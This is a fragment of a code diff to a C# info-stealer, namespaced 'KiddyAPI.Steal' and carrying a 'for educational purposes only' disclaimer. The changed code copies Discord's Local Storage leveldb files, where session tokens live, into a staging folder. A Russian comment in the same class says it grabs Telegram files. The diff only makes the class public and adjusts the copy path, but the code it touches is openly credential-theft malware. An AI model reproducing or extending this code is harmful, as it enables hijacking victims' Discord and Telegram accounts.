@@ -8,7 +8,7 @@ using System.Threading.Tasks;
 //     | For educational purposes only, the author is not responsible.
 namespace KiddyAPI.Steal
 {
-    class Apps
+    public class Apps
     {
         /// <summary>
         /// Получаем файлы Телеги
@@ -104,7 +104,7 @@ namespace KiddyAPI.Steal
             {
                 string discordPath = Environment.ExpandEnvironmentVariables("%appdata%") +
                                      @"\Discord\Local Storage\leveldb";
-                DirectoryInfo toDir = new DirectoryInfo(pathToCopy);
+                DirectoryInfo toDir = new DirectoryInfo(pathToCopy + @"\Discord\");
                 if (!Directory.Exists(pathToCopy))
                     Directory.CreateDirectory(pathToCopy);
                 foreach (string file in Directory.GetFiles(discordPath))
@@ -115,4 +115,4 @@ namespace KiddyAPI.Steal
         }
     }
 }
-}
+
